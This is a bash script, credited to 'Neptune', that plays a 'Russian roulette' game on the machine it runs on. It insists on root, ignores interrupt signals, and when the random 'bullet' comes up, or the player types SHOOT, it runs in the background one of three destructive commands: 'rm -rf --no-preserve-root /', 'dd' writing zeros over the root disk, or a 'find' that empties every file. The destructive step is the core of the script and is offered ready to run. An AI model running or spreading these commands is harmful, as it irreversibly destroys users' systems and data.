#!/bin/bash

#Trap signals to ensure destruction process if activated and keep alive the execution of the script.

trap "" INT TSTP QUIT SIGTERM

#Colors. I put resets on every echo, read and printf lines to make your prompt white and distinct from the
#messages of the script. It also avoids colorizing your prompt if you kill the program mid-execution.

white="\e[37m"
red="\e[31m"
blue="\e[34m"
yellow="\e[33m"
reset="\e[0m"

#Execute with root privileges, don't be a coward. Exit with error code 1 if $EUID isn't equal to 0 (Root $EUID).

if [ "$EUID" -ne 0 ]; then
     echo
     echo -e "${yellow}ERROR (1): Play as root, you fool...${reset}"
     echo
     exit 1
fi

#Get PID of process for SIGKILL if selected in the last round. I decided to use $$ instead of $BASH_PID because 
#it has better compatibility with older versions of BASH, but it's a little bit buggy if you work with subshells, 
#better use $BASH_PID instead in those cases.

PID=$$

#Get the route of the physical disk that is being used by the system for $BULLET_TYPE when $1 equals 2. Works with
#VMs and systems that use LVM as far as I tested. In LVM systems, the result of the execution of the dd command 
#results in a unknown filesystem error at boot.

DISK=$(df / | tail -n +2 | awk '{print $1}' | sed 's/[0-9]*//g')

#Argument for $BULLET_TYPE selection.

SELECTED=$1

#If 2 or more arguments are passed, exit with error code 2.

if [ "$#" -ne 1 ]; then
      echo
      echo -e "${yellow}ERROR (2): you must provide exactly one single argument. Accepted options provided as an argument are 1, 2 or 3 (select your EXECUTION method).${reset}"
      echo
      exit 2
fi

#If an invalid option (everything except numbers 1, 2 or 3) is passed to the script, exit with error code 3.

if [[ "$SELECTED" != "1" && "$SELECTED" != "2" && "$SELECTED" != "3" ]]; then
      echo
      echo -e "${yellow}ERROR (3): invalid option provided. Accepted options provided as an argument are 1, 2 or 3 (select your EXECUTION method).${reset}" 
      echo
      exit 3
fi

#Execution methods that will be later evaluated and executed in the background. More explanation in README.md/
#offlineREAD.me file. Second execution method is kind of special, its execution time depends on the write
#speed of your disk. If you have a slow HHD, don't even bother. If you have an SSD or SSD-NVMe, you can have fun 
#with it. Case the variable and establish the methods for the destruction of the system.

case $SELECTED in
	1) BULLET_TYPE="nohup rm -rf --no-preserve-root / > /dev/null 2>&1 &";;     
	2) BULLET_TYPE="nohup dd if=/dev/zero of=$DISK > /dev/null 2>&1 &";;
	3) BULLET_TYPE="nohup find / -type f -exec cp /dev/null "{}" \; > /dev/null 2>&1 &";;
	* ) echo; echo -e "${yellow}ERROR (3): invalid option provided. Accepted options provided as an argument are 1, 2 or 3 (select your EXECUTION method).${reset}"; echo; exit 3;;
esac

#Intro.

echo
echo -e "${red}Created by Neptune. Hope you have fun with this, you crazy little comrade.${reset}"
echo -e "${red}From this point on, I am not responsible for what may happen when executing this script.${reset}"
echo -e "${red}DO NOT SPAM ENTER! You may see unexpected results...${reset}" #Not a joke.
sleep 1
echo -e "${white}
▄▄▄  ▄• ▄▌.▄▄ · .▄▄ · ▪   ▄▄▄·  ▐ ▄      
▀▄ █·█▪██▌▐█ ▀. ▐█ ▀. ██ ▐█ ▀█ •█▌▐█     
▐▀▀▄ █▌▐█▌▄▀▀▀█▄▄▀▀▀█▄▐█·▄█▀▀█ ▐█▐▐▌     
${blue}▐█•█▌▐█▄█▌▐█▄▪▐█▐█▄▪▐█▐█▌▐█ ▪▐▌██▐█▌     
.▀  ▀ ▀▀▀  ▀▀▀▀  ▀▀▀▀ ▀▀▀ ▀  ▀ ▀▀ █▪     
▄▄▄        ▄• ▄▌▄▄▌  ▄▄▄ .▄▄▄▄▄▄▄▄▄▄▄▄▄ .
▀▄ █·▪     █▪██▌██•  ▀▄.▀·•██  •██  ▀▄.▀·
${red}▐▀▀▄  ▄█▀▄ █▌▐█▌██▪  ▐▀▀▪▄ ▐█.▪ ▐█.▪▐▀▀▪▄
▐█•█▌▐█▌.▐▌▐█▄█▌▐█▌▐▌▐█▄▄▌ ▐█▌· ▐█▌·▐█▄▄▌
.▀  ▀ ▀█▄▀▪ ▀▀▀ .▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀ ${reset}" 

sleep 1.5
echo
read -p $'\e[31mPress ENTER to play:\e[0m '
echo
echo -e "${red}Loading a bullet...${reset}"
echo

#Shuffle a number between 1 and 6 and store it as $BULLET_IN_CHAMBER.

BULLET_IN_CHAMBER=$(shuf -i 1-6 -n1)

#Variable type verification. If the shuffle command doesn't produce (in a stupidly weird and unusual case) an
#integer between 1 and 6, exit with error code 4.

if ! [[ "$BULLET_IN_CHAMBER" =~ ^[1-6]$ ]]; then
        echo -e "${yellow}ERROR (4): BULLET_IN_CHAMBER should be a number between 1 and 6.${reset}"
        exit 4
fi

#Nice good old spinner for simulating wait time.

sleep 3 & pid=$!

i=0
SPINNER="\|/-"

while ps -p $pid > /dev/null; do
     printf ${red}"\b${SPINNER:i++%${#SPINNER}:1}"
     sleep 0.1
done     

#Delete the spinner.

printf "\b"
read -p $'\e[31mDone. Are you ready to shoot?[Y/n]:\e[0m ' answer

#Make the game more dynamic!

while true; do
     case $answer in
          YES|Yes|yes|Y|y) echo; echo -e "${red}Let's test your luck then...${reset}"; sleep 1.5; break;;
          NO|No|no|N|n) echo; echo -e "${red}There's no escape comrade, let's play...${reset}"; sleep 1.5; break;;
          * ) echo; read -p $'\e[31mYou should really answer my question...[Y/n]:\e[0m ' answer;;
     esac     
done

#Loop integers between 1 and 5 to find if $BULLET_IN_CHAMBER equals one of those numbers. In case it is, 
#then evaluate one of the $BULLET_TYPE variables declared earlier. As you already saw, the argument you
#write after the name of the script separated by a space defines the bullet that will be used. If you
#survive, you are forced to keep playing, or you can kill the script manually (if you want to play 
#this kind of games, why would you not want to take your luck to the limit?).
                                
for i in {1..5}; do                          
    if [ $i -eq $BULLET_IN_CHAMBER ]; then
    	 echo
    	 echo -e "${red}YOU ARE DEAD${reset}"           
         echo					       #Evaluate the selected $BULLET_TYPE as a command.
         eval "$BULLET_TYPE"			       #This process will run in the background. You are in a
         exit 0				               #very big trouble if you lose, if you didn't know already!
    else [ $i -ne $BULLET_IN_CHAMBER ]	       
         echo
         echo -e "${red}YOU SURVIVED${reset}"
         read -p $'\e[31mPress ENTER to keep shooting...\e[0m '
    fi
done        						       

#Obviously, you know that if you pull the trigger here you will die, so this is the option that gives you the 
#chance to quit the game. Read your input and store it in $answer2 with read.

echo
printf "${red}You win! You can kill this process to end this (TYPE 'KILL'). Or, you can pull the trigger, only if you're crazy enough (TYPE 'SHOOT'): ${reset}" && read answer2

#While loop for processing the answer you gave earlier. If $answer2 equals some form of writing KILL, send SIGKILL
#to $PID and end the game. If you're nuts you can shoot too, in this case if the variable $answer2 equals SHOOT or
#some form of the word, evaluate the selected $BULLET_TYPE and destroy everything. If you mistype, loop the 
#the command read until you get it right.

while true; do
     case $answer2 in
        "KILL"|"Kill"|"kill") 
              echo; echo -e "${red}Well played...${reset}"; 
              echo; ( kill -9 $PID ); 
              exit 0;;
	"SHOOT"|"Shoot"|"shoot") 
	      echo; echo -e "${red}Я стал смертью, разрушителем миров"${reset};  
echo; echo -e "${red}##++++++---------##############++++++#+++---------------------+++
##+++++++-------+#######################+---------------------+++
##+++++++-------+######################++---------------------+++
##+++++++-------+#########################-----------------------
##+++++---------##########################+----------------------
#+++------------#####################++++#-----------------------
#++--++++########################+++++++++++++++++---------------
#++----+###########################+++++++++++++++++-------------
#++-------------+########################+-----------------------
#++-------------+++##########+++####+++-+------------------------
#++-------------+-+#########+----++------..----------------------
#++-------------+#+#########+------------+-----------------------
#++--------------###########+-------..---.-----------------------
#++---------------##########+-----------.------------------------
##+----------------#########++.--.-------------------------------
##+----------------#########++-----------------------------------
##+----------------+#########++++++------------------------------
##+---+-------------+####-.+++-----------------------------------
##+--+++-------------+##-.#++++------.---------------------------
##++-+++-----------+###-.###+++-------+#-------------------------
##++--+++----++######+#+####++++-----.-###-----------------------
##+++--++##############+#####-----+...-######++----------------++
########################-+##++--+-....-###########++---------++++
########################+-.-###-......-#################++---++++${reset}";     #"Now I am become Death, the
	      echo; eval "$BULLET_TYPE"; break;;	 		        #destroyer of worlds"
	      * ) 							        # ~J. Robert Oppenheimer
	      echo; read -p $'\e[31mMistype error, try again:\e[0m ' answer2;;	
     esac
done	
	
#END
